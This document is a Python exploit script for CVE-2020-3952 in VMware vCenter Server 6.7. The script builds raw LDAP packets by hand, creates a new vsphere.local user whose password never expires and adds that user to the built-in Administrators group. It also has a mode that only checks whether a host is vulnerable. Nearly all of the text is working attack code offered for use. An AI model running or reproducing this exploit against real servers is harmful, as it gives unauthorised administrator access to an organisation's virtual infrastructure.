# Exploit Author: Photubias
# Vendor Advisory: [1] https://www.vmware.com/security/advisories/VMSA-2020-0006.html
# Version: vCenter Server 6.7 before update 3f
# Tested on: vCenter Server Appliance 6.7 RTM (updated from v6.0)
# CVE: CVE-2020-3952

#!/usr/bin/env python3

&#039;&#039;&#039;
	Copyright 2020 Photubias(c)        
        This program is free software: you can redistribute it and/or modify
        it under the terms of the GNU General Public License as published by
        the Free Software Foundation, either version 3 of the License, or
        (at your option) any later version.

        This program is distributed in the hope that it will be useful,
        but WITHOUT ANY WARRANTY; without even the implied warranty of
        MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the
        GNU General Public License for more details.

        You should have received a copy of the GNU General Public License
        along with this program.  If not, see <http://www.gnu.org/licenses/>.
        
        Based (and reverse engineerd from): https://github.com/guardicore/vmware_vcenter_cve_2020_3952
        
        File name CVE-2020-3592.py
        written by tijl[dot]deneut[at]howest[dot]be for www.ic4.be
        
        ## Vulnerable setup (requirements): vCenter Server 6.7 that was upgraded from 6.x
        
        This is a native implementation without requirements, written in Python 3.
        Works equally well on Windows as Linux (as MacOS, probably ;-)

        Features: exploit + vulnerability checker
&#039;&#039;&#039;

import binascii, socket, sys, string, random

## Default vars; change at will
_sIP = &#039;192.168.50.35&#039;
_iPORT = 389
_iTIMEOUT = 5

def randomString(iStringLength=8):
    #sLetters = string.ascii_lowercase
    sLetters = string.ascii_letters
    return &#039;&#039;.join(random.choice(sLetters) for i in range(iStringLength))

def getLengthPrefix(sData, sPrefix, hexBytes=1): ## sData is hexlified
    sReturn = sPrefix
    if (len(sData) / 2 ) > 255:
        sReturn  += b&#039;82&#039;
        hexBytes = 2
    elif (len(sData) /2 ) >= 128:
        sReturn += b&#039;81&#039;
    sReturn += f"{int(len(sData)/2):#0{(hexBytes*2)+2}x}"[2:].encode()
    return sReturn

def buildBindRequestPacket(sUser, sPass):
    sUser = binascii.hexlify(sUser.encode())
    sPass = binascii.hexlify(sPass.encode())
    ## Packet Construction
    sPacket = getLengthPrefix(sPass, b&#039;80&#039;) + sPass
    sPacket = getLengthPrefix(sUser, b&#039;04&#039;) + sUser + sPacket
    sPacket = b&#039;020103&#039; + sPacket
    sPacket = getLengthPrefix(sPacket, b&#039;60&#039;) + sPacket
    sPacket = b&#039;020101&#039; + sPacket
    sPacket = getLengthPrefix(sPacket, b&#039;30&#039;) + sPacket
    #print(sPacket)
    return binascii.unhexlify(sPacket)    

def buildUserCreatePacket(sUser, sPass):
    sUser = binascii.hexlify(sUser.encode())
    sPass = binascii.hexlify(sPass.encode())
    def createAttribute(sName, sValue):
        sValue = getLengthPrefix(sValue, b&#039;04&#039;) + sValue
        sName = getLengthPrefix(sName, b&#039;04&#039;) + sName
        
        sReturn = getLengthPrefix(sValue, b&#039;31&#039;) + sValue
        sReturn = sName + sReturn
        sReturn = getLengthPrefix(sReturn, b&#039;30&#039;) + sReturn
        return sReturn
    
    def createObjectClass():
        sReturn = getLengthPrefix(binascii.hexlify(b&#039;top&#039;), b&#039;04&#039;) + binascii.hexlify(b&#039;top&#039;)
        sReturn += getLengthPrefix(binascii.hexlify(b&#039;person&#039;), b&#039;04&#039;) + binascii.hexlify(b&#039;person&#039;)
        sReturn += getLengthPrefix(binascii.hexlify(b&#039;organizationalPerson&#039;), b&#039;04&#039;) + binascii.hexlify(b&#039;organizationalPerson&#039;)
        sReturn += getLengthPrefix(binascii.hexlify(b&#039;user&#039;), b&#039;04&#039;) + binascii.hexlify(b&#039;user&#039;)
        
        sReturn = getLengthPrefix(sReturn, b&#039;31&#039;) + sReturn
        sReturn = getLengthPrefix(binascii.hexlify(b&#039;objectClass&#039;), b&#039;04&#039;) + binascii.hexlify(b&#039;objectClass&#039;) + sReturn
        sReturn = getLengthPrefix(sReturn, b&#039;30&#039;) + sReturn
        return sReturn
    
    ## Attributes
    sAttributes = createAttribute(binascii.hexlify(b&#039;vmwPasswordNeverExpires&#039;), binascii.hexlify(b&#039;True&#039;))
    sAttributes += createAttribute(binascii.hexlify(b&#039;userPrincipalName&#039;), sUser + binascii.hexlify(b&#039;@VSPHERE.LOCAL&#039;))
    sAttributes += createAttribute(binascii.hexlify(b&#039;sAMAccountName&#039;), sUser)
    sAttributes += createAttribute(binascii.hexlify(b&#039;givenName&#039;), sUser)
    sAttributes += createAttribute(binascii.hexlify(b&#039;sn&#039;), binascii.hexlify(b&#039;vsphere.local&#039;))
    sAttributes += createAttribute(binascii.hexlify(b&#039;cn&#039;), sUser)
    sAttributes += createAttribute(binascii.hexlify(b&#039;uid&#039;), sUser)
    sAttributes += createObjectClass()
    sAttributes += createAttribute(binascii.hexlify(b&#039;userPassword&#039;), sPass)
    ## CN
    sCN = binascii.hexlify(b&#039;cn=&#039;) + sUser + binascii.hexlify(b&#039;,cn=Users,dc=vsphere,dc=local&#039;)
    sUserEntry = getLengthPrefix(sCN, b&#039;04&#039;) + sCN
    
    ## Packet Assembly (bottom up)
    sPacket = getLengthPrefix(sAttributes, b&#039;30&#039;) + sAttributes
    sPacket = sUserEntry + sPacket
    sPacket = getLengthPrefix(sPacket, b&#039;02010268&#039;, 2) + sPacket
    sPacket = getLengthPrefix(sPacket, b&#039;30&#039;) + sPacket
    #print(sPacket)
    return binascii.unhexlify(sPacket)

def buildModifyUserPacket(sUser):
    sFQDN = binascii.hexlify((&#039;cn=&#039; + sUser + &#039;,cn=Users,dc=vsphere,dc=local&#039;).encode())
    sCN = binascii.hexlify(b&#039;cn=Administrators,cn=Builtin,dc=vsphere,dc=local&#039;)
    sMember = binascii.hexlify(b&#039;member&#039;)
    ## Packet Construction
    sPacket = getLengthPrefix(sFQDN, b&#039;04&#039;) + sFQDN
    sPacket = getLengthPrefix(sPacket, b&#039;31&#039;) + sPacket
    sPacket = getLengthPrefix(sMember, b&#039;04&#039;) + sMember + sPacket
    sPacket = getLengthPrefix(sPacket, b&#039;0a010030&#039;) + sPacket
    sPacket = getLengthPrefix(sPacket, b&#039;30&#039;) + sPacket
    sPacket = getLengthPrefix(sPacket, b&#039;30&#039;) + sPacket
    sPacket = getLengthPrefix(sCN, b&#039;04&#039;) + sCN + sPacket
    sPacket = getLengthPrefix(sPacket, b&#039;02010366&#039;) + sPacket
    sPacket = getLengthPrefix(sPacket, b&#039;30&#039;) + sPacket
    #print(sPacket)
    return binascii.unhexlify(sPacket)

def performBind(s):
    ## Trying to bind, fails, but necessary (even fails when using correct credentials)
    dPacket = buildBindRequestPacket(&#039;Administrator@vsphere.local&#039;,&#039;www.IC4.be&#039;)
    s.send(dPacket)
    sResponse = s.recv(1024)
    try:
        sResponse = sResponse.split(b&#039;\x04\x00&#039;)[0][-1:]
        sCode = binascii.hexlify(sResponse).decode()
        if sCode == &#039;31&#039;: print(&#039;[+] Ok, service reachable, continuing&#039;)
        else: print(&#039;[-] Something went wrong&#039;)
    except:
        pass
    return sCode

def performUserAdd(s, sUser, sPass):
    dPacket = buildUserCreatePacket(sUser,sPass)
    s.send(dPacket)
    sResponse = s.recv(1024)
    try:
        sCode = sResponse.split(b&#039;\x04\x00&#039;)[0][-1:]
        sMessage = sResponse.split(b&#039;\x04\x00&#039;)[1]
        if sCode == b&#039;\x00&#039;:
            print(&#039;[+] Success! User &#039; + sUser + &#039;@vsphere.local added with password &#039; + sPass)
        elif sCode == b&#039;\x32&#039;:
            print(&#039;[-] Error, this host is not vulnerable (insufficientAccessRights)&#039;)
        else:
            if sMessage[2] == b&#039;81&#039;: sMessage = sMessage[3:].decode()
            else: sMessage = sMessage[2:].decode()
            print(&#039;[-] Error, user not added, message received: &#039; + sMessage)
    except:
        pass
    return sCode
    

def performUserMod(s, sUser, verbose = True):
    dPacket = buildModifyUserPacket(sUser)
    s.send(dPacket)
    sResponse = s.recv(1024)
    try:
        sCode = sResponse.split(b&#039;\x04\x00&#039;)[0][-1:]
        sMessage = sResponse.split(b&#039;\x04\x00&#039;)[1]
        if sCode == b&#039;\x00&#039;:
            if verbose: print(&#039;[+] User modification success (if the above is OK).&#039;)
        else:
            if sMessage[2] == b&#039;81&#039;: sMessage = sMessage[3:].decode()
            else: sMessage = sMessage[2:].decode()
            if verbose: print(&#039;[-] Error during modification, message received: &#039; + sMessage)
    except:
        pass
    return sCode, sMessage

def performUnbind(s):
    try: s.send(b&#039;\x30\x05\x02\x01\x04\x42\x00&#039;)
    except: pass

def main():
    global _sIP, _iPORT, _iTIMEOUT
    _sUSER = &#039;user_&#039; + randomString(6)
    _sPASS = randomString(8) + &#039;_2020&#039;
    bAdduser = False
    if len(sys.argv) == 1:
        print(&#039;[!] No arguments found: python3 CVE-2020-3592.py <dstIP> [<newUsername>] [<newPassword>]&#039;)
        print(&#039;    Example: ./CVE-2020-3592.py &#039; + _sIP + &#039; &#039; + _sUSER + &#039; &#039; + _sPASS)
        print(&#039;    Leave username & password empty for a vulnerability check&#039;)
        print(&#039;    Watch out for vCenter/LDAP password requirements, leave empty for random password&#039;)
        print(&#039;    But for now, I will ask questions&#039;)
        sAnswer = input(&#039;[?] Please enter the vCenter IP address [&#039; + _sIP + &#039;]: &#039;)
        if not sAnswer == &#039;&#039;: _sIP = sAnswer
        sAnswer = input(&#039;[?] Want to perform a check only? [Y/n]: &#039;)
        if sAnswer.lower() == &#039;n&#039;: bAdduser = True
        if bAdduser:
            sAnswer = input(&#039;[?] Please enter the new username to add [&#039; + _sUSER + &#039;]: &#039;)
            if not sAnswer == &#039;&#039;: _sUSER = sAnswer
            sAnswer = input(&#039;[?] Please enter the new password for this user [&#039; + _sPASS + &#039;]: &#039;)
            if not sAnswer == &#039;&#039;: _sPASS = sAnswer
    else:
        _sIP = sys.argv[1]
        if len(sys.argv) >= 3:
            _sUSER = sys.argv[2]
            bAdduser = True
        if len(sys.argv) >= 4: _sPASS = sys.argv[3]

    ## MAIN
    print(&#039;&#039;)
    s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    s.settimeout(_iTIMEOUT)
    try:
        s.connect((_sIP,_iPORT))
    except:
        print(&#039;[-] Error: Host &#039; + _sIP + &#039;:&#039; + str(_iPORT) + &#039; not reachable&#039;)
        sys.exit(1)

    performBind(s)

    if bAdduser:
        sCode = performUserAdd(s, _sUSER, _sPASS)

    if not bAdduser:
        print(&#039;[!] Checking vulnerability&#039;)
        sCode, sMessage = performUserMod(s, &#039;Administrator&#039;, False)
        if sCode == b&#039;\x32&#039;: print(&#039;[-] This host is not vulnerable, message: &#039; + sMessage)
        else: print(&#039;[+] This host is vulnerable!&#039;)
    else:
        sCode = performUserMod(s, _sUSER)
    
    performUnbind(s)
    
    s.close()


if __name__ == "__main__":
    main()

